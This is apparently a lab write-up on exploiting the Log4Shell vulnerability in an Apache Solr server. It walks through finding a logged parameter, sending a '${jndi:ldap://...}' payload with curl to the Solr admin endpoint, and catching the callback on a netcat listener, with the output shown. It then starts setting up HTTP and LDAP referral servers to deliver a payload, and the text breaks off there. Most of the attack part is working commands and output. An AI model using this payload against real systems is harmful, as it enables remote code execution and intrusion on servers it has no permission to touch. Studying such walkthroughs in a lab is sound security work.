# Using Log4j to attack a vulnerable Apache Solar server. [Java 1.8.0_181]


## To start, note that...

### Dashboard seen on admin front page

### Verify that log4j in use for logging via nmap scan (all ports) - note info on dashboard as well\


### Note log directory...
```-Dsolr.log.dir```

### In logs, find an entry point 

INFO entries with repeated endpoint requests -> parameter field

## Parameter will be used as an attack vector, with a payload having syntax as follows

``` ${jndi:ldap://ATTACKERADDRESS} ```

Using JNDI to get external resources, ATTACKERADDRESS will be a nc listener on the kali machine.

```$ nc -lnvp 4444```

## Remote Code Execution - Injection
 - Log4j processes logs by parsing entries, but may EXECUTE code in entry 
 - Anywhere data is logged, is vulnerable to the syntax --- we should have identified an entry point from the logs earlier (we are sure that it will log and be processed)
  - Entry poiunt can also include forms/any source of user supplied data HTTP headers, 

Putting things together, here is an example of a maliciously crafted curl request:

```$ curl 'http://10.10.22.239:8983/solr/admin/cores?foo=$\{10.9.1.93:4444\}'```

This payload will be delivered and executed by Log4j during parsing...
```sh
┌──(kali㉿kali)-[~]
└─$ curl 'http://10.10.22.239:8983/solr/admin/cores?foo=$\{jndi:ldap://10.9.1.93:4444\}' 
{
  "responseHeader":{
    "status":0,
    "QTime":0},
  "initFailures":{},
  "status":{}}
  ```
  
Did the injection work for connnecting back to our machine??

```sh
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 4444     
listening on [any] 4444 ...
connect to [10.9.1.93] from (UNKNOWN) [10.10.22.239] 50884
0
 `�

```
It worked :D but what can we do with this???

## Exploitation 

We can run a referral server to redirect from LDAP to another location containing our desired payload.

### Need http server to host some files on our machine that contain the good stuff ;)
```python python3 -m http.server```

### Need the LDAP refferal server to redirect to the new HTTP server ***Java8 required: https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html 

